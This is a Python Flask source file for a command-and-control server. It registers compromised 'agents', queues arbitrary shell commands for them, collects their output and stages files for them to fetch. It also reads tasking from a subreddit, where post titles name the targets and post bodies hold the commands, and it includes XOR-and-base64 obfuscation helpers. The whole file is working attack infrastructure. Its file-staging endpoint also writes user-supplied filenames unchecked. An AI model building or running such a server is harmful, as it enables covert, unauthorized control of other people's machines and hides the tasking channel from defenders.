from flask import Flask, request, jsonify, send_from_directory
from datetime import datetime, timezone
from threading import Thread
import time, json, praw, requests, base64,os

from models import db, Agent, Command, ProcessedPost


with open("config.json") as f:
    cfg = json.load(f)

DB_URI = cfg.get("database_uri", "sqlite:///redc2.db")
SERVER_HOST = cfg.get("server_host", "0.0.0.0")  # bind to all interfaces
SERVER_PORT = cfg.get("server_port", 5555)
CRYPTO_KEY = cfg.get("crypto_key", "secret")
SUBREDDIT = cfg.get("subreddit", "taskdropbox")

STAGING_DIR = "staged_files"
os.makedirs(STAGING_DIR, exist_ok=True)

app = Flask(__name__)
app.config["SQLALCHEMY_DATABASE_URI"] = DB_URI
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False

db.init_app(app)

with app.app_context():
    db.create_all()


@app.route("/stage_file", methods=["POST"])
def stage_file():
    data = request.get_json()
    filename = data.get("filename")
    file_data = data.get("file_data")

    if not filename or not file_data:
        return jsonify({"error": "filename and file_data required"}), 400

    try:
        # Decode Base64 back into raw bytes
        raw_bytes = base64.b64decode(file_data)

        file_path = os.path.join(STAGING_DIR, filename)
        with open(file_path, "wb") as f:
            f.write(raw_bytes)

        return jsonify({
            "status": "staged",
            "filename": filename,
            "path": file_path
        }), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500
    
@app.route("/files/<filename>", methods=["GET"])
def get_staged_file(filename):
    try:
        return send_from_directory(STAGING_DIR, filename, as_attachment=False)
    except Exception as e:
        return jsonify({"error": f"File not found: {e}"}), 404

@app.route("/register", methods=["POST"])
def register():
    data = request.get_json()
    agent_id = data.get("agent_id")
    hostname = data.get("hostname")
    local_ip = data.get("local_ip")
    os_info = data.get("os_info")

    if not agent_id:
        return jsonify({"error": "no agent_id provided"}), 400

    agent = Agent.query.get(agent_id)
    if not agent:
        agent = Agent(
            agent_id=agent_id,
            os_info=os_info,
            hostname=hostname,
            local_ip=local_ip,
            last_seen=datetime.now(timezone.utc),
            status="Alive"
        )
        db.session.add(agent)
    else:
        agent.hostname = hostname
        agent.local_ip = local_ip
        agent.last_seen = datetime.now(timezone.utc)
        agent.status = "Alive"

    db.session.commit()
    return jsonify({"status": "registered", "agent_id": agent_id})


@app.route("/heartbeat", methods=["POST"])
def heartbeat():
    data = request.get_json()
    agent_id = data.get("agent_id")

    if not agent_id:
        return jsonify({"error": "no agent_id provided"}), 400

    agent = Agent.query.get(agent_id)
    if agent:
        agent.last_seen = datetime.now(timezone.utc)
        db.session.commit()

    cmds = Command.query.filter_by(agent_id=agent_id, status="Queued").all()
    cmd_list = [{"command_id": c.id, "command": c.command} for c in cmds]

    return jsonify({"agent_id": agent_id, "commands": cmd_list})


@app.route("/queue", methods=["POST"])
def queue_command():
    data = request.get_json()
    agent_id = data.get("agent_id")
    cmd_text = data.get("command")

    if not agent_id or not cmd_text:
        return jsonify({"error": "agent_id and command required"}), 400

    new_cmd = Command(agent_id=agent_id, command=cmd_text, status="Queued")
    db.session.add(new_cmd)
    db.session.commit()

    return jsonify({
        "status": "queued",
        "agent_id": agent_id,
        "command": cmd_text,
        "command_id": new_cmd.id
    })


@app.route("/result", methods=["POST"])
def result():
    data = request.get_json()
    cmd_id = data.get("command_id")
    output = data.get("result")

    if not cmd_id or output is None:
        return jsonify({"error": "command_id and result required"}), 400

    command = Command.query.get(cmd_id)
    if command:
        command.status = "Completed"
        command.result = output
        command.completed_at = datetime.now(timezone.utc)
        db.session.commit()

    return jsonify({"status": "result stored", "command_id": cmd_id})


@app.route("/processed", methods=["POST"])
def mark_processed():
    data = request.get_json()
    post_id = data.get("post_id")

    if not post_id:
        return jsonify({"error": "no post_id"}), 400

    if not ProcessedPost.query.get(post_id):
        db.session.add(ProcessedPost(post_id=post_id))
        db.session.commit()

    return jsonify({"status": "ok", "post_id": post_id})




@app.route("/processed/<post_id>", methods=["GET"])
def check_processed(post_id):
    exists = ProcessedPost.query.get(post_id)
    if exists:
        return jsonify({"status": "processed", "post_id": post_id}), 200
    return jsonify({"status": "not_found"}), 404


@app.route("/agents", methods=["GET"])
def list_agents():
    agents = Agent.query.all()
    data = []
    for a in agents:
        data.append({
            "agent_id": a.agent_id,
            "hostname": a.hostname,
            "local_ip": a.local_ip,
            "os_info": a.os_info,
            "last_seen": a.last_seen.isoformat() if a.last_seen else None,
            "status": a.status
        })
    return jsonify(data)


@app.route("/agents/<id>", methods=["GET"])
def get_agents_commands(id):
    agent = Agent.query.get(id)
    if not agent:
        return jsonify({"error": "agent not found"}), 404

    cmd_list = [{
        "Command Id": c.id,
        "Command": c.command,
        "Status": c.status,
        "Result": c.result
    } for c in agent.commands]

    return jsonify({
        "Agent Id": agent.agent_id,
        "Hostname": agent.hostname,
        "Local IP": agent.local_ip,
        "Status": agent.status,
        "Last Seen": agent.last_seen.isoformat() if agent.last_seen else None,
        "Commands": cmd_list
    })


@app.route("/tasks/<status>", methods=["GET"])
def get_tasks(status):
    cmds = Command.query.filter_by(status=status.capitalize()).all()
    return jsonify([
        {
            "Command Id": c.id,
            "Agent Id": c.agent_id,
            "Command": c.command,
            "Status": c.status,
            "Result": c.result
        }
        for c in cmds
    ])


def poll_reddit():
    reddit = praw.Reddit(
        client_id=cfg["client_id"],
        client_secret=cfg["client_secret"],
        username=cfg["username"],
        password=cfg["password"],
        user_agent=cfg["user_agent"]
    )

    while True:
        subreddit = reddit.subreddit(SUBREDDIT)
        for post in subreddit.new(limit=5):
            resp = requests.get(f"http://{SERVER_HOST}:{SERVER_PORT}/processed/{post.id}")
            if resp.status_code == 200:
                continue

            targets = [t.strip() for t in post.title.split(",") if t.strip()]
            commands = [c.strip() for c in post.selftext.split("\n") if c.strip()]

            for endpoint in targets:
                for command in commands:
                    payload = {"agent_id": endpoint, "command": command}
                    requests.post(f"http://{SERVER_HOST}:{SERVER_PORT}/queue", json=payload)

            requests.post(f"http://{SERVER_HOST}:{SERVER_PORT}/processed", json={"post_id": post.id})

        time.sleep(60)


def monitor_agents():
    while True:
        now = datetime.now(timezone.utc)
        with app.app_context():
            agents = Agent.query.all()
            for a in agents:
                delta = ((now - a.last_seen.replace(tzinfo=timezone.utc)).total_seconds() if a.last_seen else 999999)
                a.status = "Alive" if delta < 120 else "Dead"
            db.session.commit()
        time.sleep(30)


def xor(data: str, key=CRYPTO_KEY) -> str:
    return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def encrypt(data: str, key=CRYPTO_KEY) -> str:
    return base64.b64encode(xor(data, key).encode()).decode()

def decrypt(data: str, key=CRYPTO_KEY) -> str:
    return xor(base64.b64decode(data.encode()).decode(), key)


if __name__ == "__main__":
    print(f"[+] Starting C2 Server on {SERVER_HOST}:{SERVER_PORT}")

    Thread(target=poll_reddit, daemon=True).start()
    Thread(target=monitor_agents, daemon=True).start()

    app.run(host=SERVER_HOST, port=SERVER_PORT, debug=False)
